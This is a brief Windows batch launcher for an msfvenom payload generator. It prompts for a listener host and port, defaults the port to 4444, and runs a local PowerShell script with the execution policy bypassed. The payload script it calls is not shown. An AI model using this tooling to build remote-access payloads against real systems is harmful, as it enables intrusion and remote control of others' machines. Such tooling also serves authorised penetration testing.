@echo off
REM msfvenom payload generator
cd /d "%~dp0"
set /p LHOST=LHOST: 
set /p LPORT=LPORT (default 4444): 
if "%LPORT%"=="" set LPORT=4444
powershell -ExecutionPolicy Bypass -File ".\payload.ps1" -LHOST %LHOST% -LPORT %LPORT%
pause
